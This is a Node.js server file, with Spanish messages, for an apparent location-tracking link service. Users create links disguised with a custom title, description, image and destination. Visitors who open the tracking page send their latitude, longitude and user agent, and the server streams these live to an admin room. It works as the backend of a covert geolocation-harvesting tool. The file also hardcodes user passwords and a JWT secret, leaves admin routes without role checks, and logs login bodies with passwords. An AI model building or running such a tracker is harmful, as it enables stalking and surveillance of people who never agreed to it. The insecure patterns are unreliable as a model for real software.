const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');
const cookieParser = require('cookie-parser');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: '*', // Allow all for dev, restrict in prod
        methods: ['GET', 'POST']
    }
});

const PORT = 3001;
const SECRET_KEY = 'super-secret-key-change-in-prod';
const DB_FILE = path.join(__dirname, 'db.json');

// Middleware
app.use(cors());
app.use(express.json());
app.use(cookieParser());

// Database Helper
const getDb = () => {
    if (!fs.existsSync(DB_FILE)) {
        const initial = { links: [], sessions: [] };
        fs.writeFileSync(DB_FILE, JSON.stringify(initial, null, 2));
        return initial;
    }
    return JSON.parse(fs.readFileSync(DB_FILE));
};

const saveDb = (data) => {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
};

// Users (Hardcoded)
const USERS = [
    { email: 'admin@admin', password: '1234567', role: 'admin' },
    { email: 'user@user.com', password: '1234567', role: 'user' }
];

// Auth Middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (token == null) return res.sendStatus(401);

    jwt.verify(token, SECRET_KEY, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

// --- ROUTES ---

// Login
app.post('/api/login', (req, res) => {
    console.log('Login request:', req.body);
    const { email, password } = req.body;
    const user = USERS.find(u => u.email === email && u.password === password);

    if (user) {
        const token = jwt.sign({ email: user.email, role: user.role }, SECRET_KEY, { expiresIn: '24h' });
        res.json({ token, role: user.role });
    } else {
        res.status(401).json({ message: 'Credenciales inválidas' });
    }
});

// Create Link
app.post('/api/links', authenticateToken, (req, res) => {
    const { title, description, imageUrl, destinationUrl } = req.body;
    const db = getDb();

    const newLink = {
        id: Math.random().toString(36).substr(2, 9),
        title,
        description,
        imageUrl,
        destinationUrl,
        createdAt: new Date().toISOString(),
        createdBy: req.user.email
    };

    db.links.push(newLink);
    saveDb(db);
    res.json(newLink);
});

// Get Link Public Info (for the tracking page)
app.get('/api/links/:id', (req, res) => {
    const db = getDb();
    const link = db.links.find(l => l.id === req.params.id);
    if (link) {
        res.json({
            title: link.title,
            description: link.description,
            imageUrl: link.imageUrl,
            destinationUrl: link.destinationUrl
        });
    } else {
        res.status(404).json({ message: 'Enlace no encontrado' });
    }
});

// Get All Links (Admin only)
app.get('/api/admin/links', authenticateToken, (req, res) => {
    const db = getDb();
    res.json(db.links);
});

// Get Active Sessions (Admin only) - Could also rely purely on socket, but good for initial state
app.get('/api/admin/sessions', authenticateToken, (req, res) => {
    const db = getDb();
    res.json(db.sessions);
});

// --- SOCKET.IO ---

io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    // Admin joins 'admin-room' to receive updates
    socket.on('join-admin', () => {
        socket.join('admin-room');
    });

    // Client sends location
    socket.on('update-location', ({ linkId, lat, lng, userAgent }) => {
        const session = {
            socketId: socket.id,
            linkId,
            lat,
            lng,
            userAgent,
            timestamp: new Date().toISOString()
        };

        // Save to DB (optional, simplified for "Real-time" focus)
        const db = getDb();
        const existingIndex = db.sessions.findIndex(s => s.socketId === socket.id);
        if (existingIndex >= 0) {
            db.sessions[existingIndex] = session;
        } else {
            db.sessions.push(session);
        }
        saveDb(db);

        // Broadcast to admins
        io.to('admin-room').emit('location-updated', session);
    });

    socket.on('disconnect', () => {
        // Remove active session
        const db = getDb();
        db.sessions = db.sessions.filter(s => s.socketId !== socket.id);
        saveDb(db);

        // Notify admins to remove marker
        io.to('admin-room').emit('client-disconnected', socket.id);
    });
});

server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
